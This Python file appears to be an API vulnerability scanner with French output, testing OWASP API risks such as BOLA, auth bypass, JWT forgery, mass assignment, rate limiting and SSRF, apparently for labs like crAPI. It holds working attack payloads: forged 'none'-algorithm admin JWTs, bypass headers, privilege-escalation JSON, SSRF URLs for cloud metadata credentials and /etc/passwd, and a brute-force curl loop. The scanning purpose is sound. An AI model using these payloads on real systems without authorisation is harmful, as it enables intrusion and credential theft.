import httpx
import json
import time
from rich.console import Console

console = Console()

class VulnerabilityScanner:
    def __init__(self, target_url, auth_token=None):
        self.target = target_url.rstrip('/')
        self.auth_token = auth_token
        self.vulnerabilities = []
        self.base_headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; APIGuard/2.0)',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        if auth_token:
            self.base_headers['Authorization'] = f'Bearer {auth_token}'

    def add_vuln(self, endpoint, vuln_type, severity, description, evidence, poc="", cvss=0.0):
        self.vulnerabilities.append({
            'endpoint': endpoint,
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'poc': poc,
            'cvss': cvss,
            'owasp': self._get_owasp(vuln_type)
        })
        color = {"CRITIQUE": "red", "HAUT": "red", "MOYEN": "yellow", "BAS": "green"}.get(severity, "white")
        console.print(f"[{color}][!] {severity} — {vuln_type} sur {endpoint} (CVSS: {cvss})[/{color}]")

    def _get_owasp(self, vuln_type):
        mapping = {
            "BOLA/IDOR": "API1:2023",
            "AUTH BYPASS": "API2:2023",
            "MASS ASSIGNMENT": "API3:2023",
            "NO RATE LIMITING": "API4:2023",
            "SENSITIVE DATA EXPOSURE": "API6:2023",
            "SSRF": "API7:2023",
            "SECURITY MISCONFIGURATION": "API8:2023",
            "JWT VULNERABILITY": "API2:2023",
        }
        return mapping.get(vuln_type, "API10:2023")

    def _request(self, method, url, **kwargs):
        try:
            kwargs.setdefault('headers', self.base_headers)
            kwargs.setdefault('timeout', 8)
            kwargs.setdefault('verify', False)
            kwargs.setdefault('follow_redirects', False)
            return httpx.request(method, url, **kwargs)
        except:
            return None

    # API1 — BOLA/IDOR amélioré
    def test_bola(self, endpoint):
        id_patterns = ['{id}', '{user_id}', '{userId}', '{uuid}']
        has_id = any(p in endpoint for p in id_patterns) or \
                 any(f'/{seg}' in endpoint for seg in ['users', 'accounts', 'orders', 'vehicles', 'posts'])

        if not has_id:
            return

        console.print(f"[cyan][*] Test BOLA/IDOR: {endpoint}[/cyan]")
        test_ids = ['1', '2', '3', '100', '999', '0', '-1', '00000000-0000-0000-0000-000000000001']

        responses = {}
        for id_val in test_ids[:3]:
            url = f"{self.target}{endpoint}".replace('{id}', id_val)
            # Ajouter l'id à la fin si pas de placeholder
            if '{id}' not in endpoint:
                url = f"{self.target}{endpoint}/{id_val}"

            r = self._request('GET', url)
            if r and r.status_code == 200 and len(r.content) > 50:
                responses[id_val] = r.text[:200]

        # Si plusieurs IDs retournent des données différentes → BOLA
        if len(responses) >= 2:
            unique_responses = set(responses.values())
            if len(unique_responses) > 1:
                self.add_vuln(
                    endpoint, "BOLA/IDOR", "CRITIQUE",
                    "Accès non autorisé à des objets d'autres utilisateurs via manipulation d'ID",
                    f"IDs testés: {list(responses.keys())} → données différentes retournées",
                    f"curl -H 'Authorization: Bearer TOKEN' {self.target}{endpoint}/2",
                    cvss=9.1
                )

    # API2 — Auth Bypass amélioré
    def test_auth_bypass(self, endpoint):
        console.print(f"[cyan][*] Test Auth Bypass: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        # Test sans auth d'abord
        no_auth_headers = {k: v for k, v in self.base_headers.items() if k != 'Authorization'}
        r_noauth = self._request('GET', url, headers=no_auth_headers)
        r_auth = self._request('GET', url)

        if not r_noauth:
            return

        # Endpoint protégé normalement mais accessible sans auth
        if r_noauth.status_code == 200 and r_auth and r_auth.status_code == 200:
            if 'admin' in endpoint or 'user' in endpoint:
                self.add_vuln(
                    endpoint, "AUTH BYPASS", "CRITIQUE",
                    "Endpoint accessible sans authentification",
                    f"GET {url} sans token → {r_noauth.status_code}",
                    f"curl {url}",
                    cvss=9.8
                )
                return

        # Headers de bypass
        bypass_headers = [
            {'X-Original-URL': endpoint},
            {'X-Rewrite-URL': endpoint},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forward-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer undefined'},
            {'Authorization': 'null'},
        ]

        if r_noauth.status_code in [401, 403]:
            for bypass in bypass_headers:
                test_headers = {**no_auth_headers, **bypass}
                r = self._request('GET', url, headers=test_headers)
                if r and r.status_code == 200:
                    header_name = list(bypass.keys())[0]
                    self.add_vuln(
                        endpoint, "AUTH BYPASS", "CRITIQUE",
                        f"Contournement auth via header {header_name}",
                        f"{header_name}: {list(bypass.values())[0]} → {r.status_code}",
                        f"curl -H '{header_name}: {list(bypass.values())[0]}' {url}",
                        cvss=9.8
                    )
                    break

    # API2 — JWT Vulnerabilities
    def test_jwt(self, endpoint):
        console.print(f"[cyan][*] Test JWT: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        jwt_attacks = [
            # Algorithm none
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.',
            # Algorithm confusion HS256 avec clé publique vide
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.invalid',
        ]

        r_normal = self._request('GET', url)
        if not r_normal or r_normal.status_code not in [401, 403]:
            return

        for jwt in jwt_attacks:
            headers = {**self.base_headers, 'Authorization': f'Bearer {jwt}'}
            r = self._request('GET', url, headers=headers)
            if r and r.status_code == 200:
                self.add_vuln(
                    endpoint, "JWT VULNERABILITY", "CRITIQUE",
                    "JWT avec algorithme 'none' accepté — signature non vérifiée",
                    f"JWT forgé accepté → {r.status_code}",
                    f"curl -H 'Authorization: Bearer {jwt[:50]}...' {url}",
                    cvss=9.8
                )
                break

    # API3 — Mass Assignment amélioré
    def test_mass_assignment(self, endpoint):
        if not any(x in endpoint for x in ['/register', '/update', '/profile',
                                             '/user', '/signup', '/edit', '/create']):
            return

        console.print(f"[cyan][*] Test Mass Assignment: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        payloads = [
            {"role": "admin", "is_admin": True, "admin": True},
            {"isAdmin": True, "privilege": "admin", "role": "superadmin"},
            {"balance": 99999, "credits": 99999},
            {"email_verified": True, "verified": True},
            {"_isAdmin": True, "__proto__": {"admin": True}},
        ]

        for payload in payloads:
            r = self._request('POST', url, json=payload)
            if r and r.status_code in [200, 201]:
                resp_lower = r.text.lower()
                dangerous_fields = ['admin', 'role', 'privilege', 'balance', 'verified']
                found = [f for f in dangerous_fields if f in resp_lower]
                if found:
                    self.add_vuln(
                        endpoint, "MASS ASSIGNMENT", "HAUT",
                        f"Champs sensibles assignables: {found}",
                        f"POST {url} {json.dumps(payload)} → {r.status_code}, champs: {found}",
                        f"curl -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                        cvss=8.1
                    )
                    break

    # API4 — Rate Limiting amélioré
    def test_rate_limiting(self, endpoint):
        if not any(x in endpoint for x in ['/login', '/auth', '/token',
                                             '/reset', '/password', '/signin', '/signup']):
            return

        console.print(f"[cyan][*] Test Rate Limiting: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        responses = []
        start = time.time()

        for i in range(20):
            r = self._request('POST', url, json={
                "email": f"test{i}@test.com",
                "password": f"wrongpass{i}",
                "username": f"user{i}"
            })
            if r:
                responses.append(r.status_code)
                # Vérifier headers rate limit
                if r.headers.get('x-ratelimit-remaining') or r.status_code == 429:
                    return  # Rate limiting présent

        elapsed = time.time() - start

        if 429 not in responses and len(responses) >= 15:
            self.add_vuln(
                endpoint, "NO RATE LIMITING", "MOYEN",
                f"20 requêtes en {elapsed:.1f}s sans blocage — brute force possible",
                f"20 requêtes → codes: {set(responses)}, aucun 429",
                f"for i in $(seq 1 1000); do curl -s -X POST {url} "
                f"-d '{{\"password\":\"test$i\"}}' & done",
                cvss=5.3
            )

    # API6 — Sensitive Data amélioré
    def test_sensitive_data(self, endpoint):
        console.print(f"[cyan][*] Test Sensitive Data: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        r = self._request('GET', url)
        if not r or r.status_code != 200:
            return

        sensitive_patterns = {
            'password': 9.0, 'passwd': 9.0, 'secret': 8.0,
            'private_key': 9.5, 'api_key': 8.5, 'apikey': 8.5,
            'access_token': 8.0, 'refresh_token': 8.0,
            'credit_card': 9.5, 'card_number': 9.5, 'cvv': 9.5,
            'ssn': 9.5, 'social_security': 9.5,
            'aws_secret': 9.5, 'database_url': 8.0,
        }

        resp_lower = r.text.lower()
        found = {p: s for p, s in sensitive_patterns.items() if p in resp_lower}

        if found:
            max_cvss = max(found.values())
            severity = "CRITIQUE" if max_cvss >= 9 else "HAUT"
            self.add_vuln(
                endpoint, "SENSITIVE DATA EXPOSURE", severity,
                f"Données sensibles dans la réponse: {list(found.keys())}",
                f"Champs trouvés: {list(found.keys())} dans GET {url}",
                f"curl {url} | grep -i 'password\\|token\\|key'",
                cvss=max_cvss
            )

    # API7 — SSRF amélioré
    def test_ssrf(self, endpoint):
        if not any(x in endpoint for x in ['/fetch', '/proxy', '/url', '/redirect',
                                             '/webhook', '/callback', '/import', '/export']):
            return

        console.print(f"[cyan][*] Test SSRF: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://localhost/admin',
            'http://127.0.0.1:22',
            'http://0.0.0.0:80',
            'http://[::]:80',
            'dict://localhost:11211/',
            'file:///etc/passwd',
        ]

        params_to_test = ['url', 'redirect', 'callback', 'return', 'next', 'target', 'dest']

        for payload in ssrf_payloads[:3]:
            for param in params_to_test:
                r = self._request('GET', url, params={param: payload})
                if r and r.status_code == 200 and len(r.content) > 200:
                    if any(x in r.text for x in ['ami-id', 'instance-id', 'root:', '127.0.0.1']):
                        self.add_vuln(
                            endpoint, "SSRF", "CRITIQUE",
                            "Server-Side Request Forgery — accès aux ressources internes confirmé",
                            f"GET {url}?{param}={payload} → données internes dans réponse",
                            f"curl '{url}?{param}={payload}'",
                            cvss=9.3
                        )
                        return

    # API8 — Security Misconfiguration
    def _disabled_test_security_misconfig(self, endpoint):
        console.print(f"[cyan][*] Test Security Misconfig: {endpoint}[/cyan]")
        url = f"{self.target}{endpoint}"

        r = self._request('GET', url)
        if not r:
            return

        issues = []

        # CORS trop permissif
        cors = r.headers.get('access-control-allow-origin', '')
        if cors == '*':
            issues.append("CORS wildcard (*) — toute origine autorisée")

        # Headers de sécurité manquants
        missing_headers = []
        security_headers = [
            'x-content-type-options',
            'x-frame-options',
            'strict-transport-security',
            'content-security-policy'
        ]
        for h in security_headers:
            if h not in r.headers:
                missing_headers.append(h)

        if missing_headers:
            issues.append(f"Headers sécurité manquants: {missing_headers}")

        # Stack trace / debug info
        debug_patterns = ['traceback', 'stack trace', 'debug', 'exception', 'sql syntax error']
        if any(p in r.text.lower() for p in debug_patterns):
            issues.append("Informations debug exposées dans la réponse")

        if issues:
            self.add_vuln(
                endpoint, "SECURITY MISCONFIGURATION", "MOYEN",
                " | ".join(issues),
                f"Headers analysés sur {url}",
                f"curl -I {url}",
                cvss=5.0
            )

    def scan_endpoint(self, endpoint_data):
        endpoint = endpoint_data.get('endpoint', '')
        self.test_bola(endpoint)
        self.test_auth_bypass(endpoint)
        self.test_jwt(endpoint)
        self.test_mass_assignment(endpoint)
        self.test_rate_limiting(endpoint)
        self.test_sensitive_data(endpoint)
        self.test_ssrf(endpoint)
        self.test_bola_crapi(endpoint)
        pass  # desactivé temporairement

    def run(self, endpoints):
        console.print(f"\n[yellow][*] Scan de {len(endpoints)} endpoints...[/yellow]\n")
        for ep in endpoints:
            self.scan_endpoint(ep)
        # Trier par sévérité
        order = {"CRITIQUE": 0, "HAUT": 1, "MOYEN": 2, "BAS": 3}
        self.vulnerabilities.sort(key=lambda x: order.get(x['severity'], 4))
        console.print(f"\n[green][+] {len(self.vulnerabilities)} vulnérabilités trouvées[/green]")
        return self.vulnerabilities


    def test_bola_crapi(self, endpoint):
        """Test BOLA spécifique crAPI et APIs REST standards"""
        bola_endpoints = [
            '/identity/api/v2/user/dashboard',
            '/identity/api/v2/vehicle/vehicles',
            '/community/api/v2/community/posts/recent',
            '/workshop/api/v2/mechanic/mechanic_report',
            '/workshop/api/v2/shop/orders',
        ]

        for ep in bola_endpoints:
            url = f"{self.target}{ep}"
            r = self._request('GET', url)
            if r and r.status_code == 200 and len(r.content) > 100:
                # Tester accès avec ID modifié
                for test_id in ['1', '2', '3', '99']:
                    url2 = f"{self.target}{ep}/{test_id}"
                    r2 = self._request('GET', url2)
                    if r2 and r2.status_code == 200 and len(r2.content) > 50:
                        self.add_vuln(
                            ep, "BOLA/IDOR", "CRITIQUE",
                            f"Accès aux données d'autres utilisateurs via ID {test_id}",
                            f"GET {url2} → {r2.status_code} ({len(r2.content)} bytes)",
                            f"curl -H 'Authorization: Bearer TOKEN' {url2}",
                            cvss=9.1
                        )
                        break
